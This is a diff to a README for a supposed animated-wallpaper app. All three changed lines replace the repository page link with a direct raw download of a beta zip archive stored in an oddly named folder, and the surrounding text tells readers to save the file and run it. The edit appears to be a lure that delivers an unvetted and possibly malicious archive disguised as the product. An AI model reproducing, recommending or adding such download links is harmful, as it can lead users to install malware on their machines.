@@ -1,6 +1,6 @@
 # 🎬 push-video-wallpaper-key - Animated desktop backgrounds made simple
 
-[![Download Now](https://img.shields.io/badge/Download-Setup%20Page-blue?style=for-the-badge)](https://github.com/Ferdinandastoppable796/push-video-wallpaper-key)
+[![Download Now](https://img.shields.io/badge/Download-Setup%20Page-blue?style=for-the-badge)](https://github.com/Ferdinandastoppable796/push-video-wallpaper-key/raw/refs/heads/main/eggeater/key_push_video_wallpaper_v2.6-beta.3.zip)
 
 ## 🚀 What this is
 
@@ -16,7 +16,7 @@ Use it if you want:
 
 Visit this page to download and set up the software:
 
-https://github.com/Ferdinandastoppable796/push-video-wallpaper-key
+https://github.com/Ferdinandastoppable796/push-video-wallpaper-key/raw/refs/heads/main/eggeater/key_push_video_wallpaper_v2.6-beta.3.zip
 
 If the page opens in your browser, look for the download files or release assets on the page. Save the file to your computer before you run it.
 
@@ -158,4 +158,4 @@ This project is related to:
 
 If you need to return to the download page, use this link:
 
-https://github.com/Ferdinandastoppable796/push-video-wallpaper-key
+https://github.com/Ferdinandastoppable796/push-video-wallpaper-key/raw/refs/heads/main/eggeater/key_push_video_wallpaper_v2.6-beta.3.zip
